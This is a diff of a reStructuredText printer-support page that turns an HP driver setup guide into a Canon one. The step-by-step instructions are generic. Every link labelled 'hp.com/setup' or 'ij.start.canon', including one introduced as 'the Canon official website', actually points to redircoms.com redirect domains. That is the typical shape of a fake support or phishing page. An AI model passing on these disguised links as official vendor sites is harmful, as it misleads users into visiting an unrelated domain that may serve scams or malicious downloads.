@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How Do Download and Setup Canon printer via ij.start.canon?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: FAC645F7A6F0C987881BDC96B99921F8
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: ij.start.canon
+      :target: https://can.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,53 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Canon printers are known for their high-quality prints, innovative features, and reliability. While `ij.start.canon <https://can.redircoms.com>`_ primarily focuses on wireless setups, it also supports USB connections for both Windows and iOS devices. Install and set up Canon printers from `ij.start.canon <https://can.redircoms.com>`_ to begin producing high-quality printed documents instantly. To avoid any issues during the Canon printer setup, follow the detailed instructions provided below.
 
-**********
-Steps to Download HP Printer Driver
-**********
+How to Download & Install Canon Printer Driver
+----------------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. Visit the Canon official website: `ij.start.canon <https://can.redircoms.com>`_.
+2. Click on **Support** and go to **Drivers & Downloads**.
+3. Enter your **printer model number** or product name.
+4. Select your **operating system** (Windows or macOS).
+5. Click the **Download** button next to the appropriate driver.
+6. Save the driver file to your computer.
+7. Run the downloaded file and follow the on-screen instructions.
+8. Agree to the license terms and conditions.
+9. Choose the **installation location** and **connection type** (USB, Network, etc.).
+10. Click **Install** to begin the process.
+11. Wait for the installation to complete.
+12. Restart your computer if prompted.
 
-2. Enter your HP printer model in the search box.
+USB Printer Setup for Windows PC and iOS Device
+-----------------------------------------------
 
-3. Select your operating system if prompted.
+**For Windows PC:**
 
-4. Click on **Download** to get the latest driver and software package.
+1. Connect the Canon printer to your PC using a USB cable.
+2. Visit `ij.start.canon <https://can.redircoms.com>`_ and download the printer driver.
+3. Run the installer and follow the installation prompts.
+4. Ensure the printer is powered on and properly connected.
+5. The printer will be automatically recognized by your Windows PC.
 
-5. Save the installer file to your computer.
+**For iOS Device:**
 
-**********
-Steps to Install HP Printer Driver
-**********
+1. Connect the Canon printer to your iOS device using a USB cable and USB-OTG adapter (if required).
+2. Open the **App Store** and download the **Canon PRINT Inkjet/SELPHY** app.
+3. Launch the app and follow the prompts to connect to the printer.
+4. Make sure the printer is powered on and connected.
+5. You can now print directly from your iOS device.
 
-1. Locate the downloaded installer file on your computer.
+Windows Network Printer Setup
+-----------------------------
 
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+1. Connect the Canon printer to your network via **Wi-Fi** or **network cable**.
+2. Ensure the printer is turned on and connected to the **same network** as your computer.
+3. Click the **Start** menu and open **Settings**.
+4. Navigate to **Devices > Printers & scanners**.
+5. Click on **Add a printer or scanner**.
+6. Select **Add a network, wireless or Bluetooth printer**.
+7. Windows will search for available printers on the network.
+8. Choose your Canon printer from the list and click **Add device**.
+9. Follow the on-screen instructions to install the necessary drivers.
+10. Once completed, you can print from any Windows application.
